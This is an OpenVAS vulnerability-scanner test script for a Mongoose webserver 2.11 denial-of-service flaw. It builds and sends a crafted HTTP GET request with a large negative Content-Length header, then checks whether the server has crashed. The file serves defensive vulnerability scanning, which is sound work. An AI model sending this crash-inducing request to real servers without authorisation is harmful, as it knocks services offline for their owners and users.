###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mongoose_websrv_cnt_len_dos_vuln.nasl 8338 2018-01-09 08:00:38Z teissa $
#
# Mongoose Webserver Content-Length Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_impact = "Successful exploitation will let the remote unauthenticated
attackers to cause a denial of service or possibly execute arbitrary code.

Impact Level: System/Application";

tag_affected = "Mongoose webserver version 2.11 and prior.";

tag_insight = "The flaw is due to the way Mongoose webserver handles request
with a big nagitive 'Content-Length' causing application crash.";

tag_summary = "This host is running Mongoose Webserver and is prone to denial
of service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900268");
  script_version("$Revision: 8338 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-09 09:00:38 +0100 (Tue, 09 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-12-31 07:04:16 +0100 (Fri, 31 Dec 2010)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Mongoose Webserver Content-Length Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "http://code.google.com/p/mongoose/");
  script_xref(name : "URL" , value : "http://www.johnleitch.net/Vulnerabilities/Mongoose.2.11.Denial.Of.Service/74");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 8080);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8080);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server:" >< banner){
  exit(0);
}

if(http_is_dead(port:port))exit(0);

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Construct attack request with big -ve Content-Length
attackReq = string( 'GET / HTTP/1.1\r\n',
                    'Host: ' + host + '\r\n',
                    'Content-Length: -2147483648\r\n\r\n' );

## Send crafted Request
res = http_keepalive_send_recv(port:port, data:attackReq);

sleep(5);

if(http_is_dead(port:port)){
  security_message(port);
  exit(0);
}
